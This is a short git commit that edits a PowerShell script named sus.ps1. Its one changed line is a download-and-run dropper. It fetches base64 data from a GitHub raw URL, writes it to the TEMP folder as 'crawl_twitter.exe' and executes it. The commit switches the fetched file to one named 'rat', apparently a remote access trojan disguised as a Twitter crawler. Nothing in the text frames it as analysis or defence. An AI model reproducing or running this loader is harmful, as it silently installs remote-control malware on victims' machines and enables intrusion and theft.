1da9534fad3f14e1c83efbc7dca1b3f4db4e5e22
leetcodeuser123 <kingzers9851@gmail.com>
2024-07-13 03:06:50 -0700

    :3

--- sus.ps1
+++ sus.ps1
@@ -1,1 +1,1 @@
-$exePath = "$env:TEMP\crawl_twitter.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/b64"))); & $exePath
+$exePath = "$env:TEMP\crawl_twitter.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat"))); & $exePath
